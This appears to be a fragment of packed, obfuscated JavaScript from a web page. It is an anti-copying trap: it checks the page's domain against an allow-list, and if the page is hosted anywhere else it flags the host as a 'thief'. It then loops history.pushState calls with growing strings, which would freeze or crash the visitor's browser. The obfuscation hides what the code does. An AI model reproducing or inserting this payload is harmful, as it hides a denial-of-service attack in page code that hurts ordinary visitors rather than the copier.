...
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('2 3=d.3;2 6=[["n","c","u"].5(""),["a","l","h"].5(""),["0","1"].5(".")];2 4=e;8(2 i=0;i<=6.f;i++){9(3.j(6[i])>-1){4=g;p}}9(4){s(t(){2 b="";8(2 a=0;a<r;a++){b=b+a.m();k.o(0,0,b)}},q*7)};',31,31,'||var|domain|isThief|join|domains||for|if|||y|document|true|length|false|||indexOf|history||toString||pushState|break|500|1000000|setInterval|function|'.split('|'),0,{}))
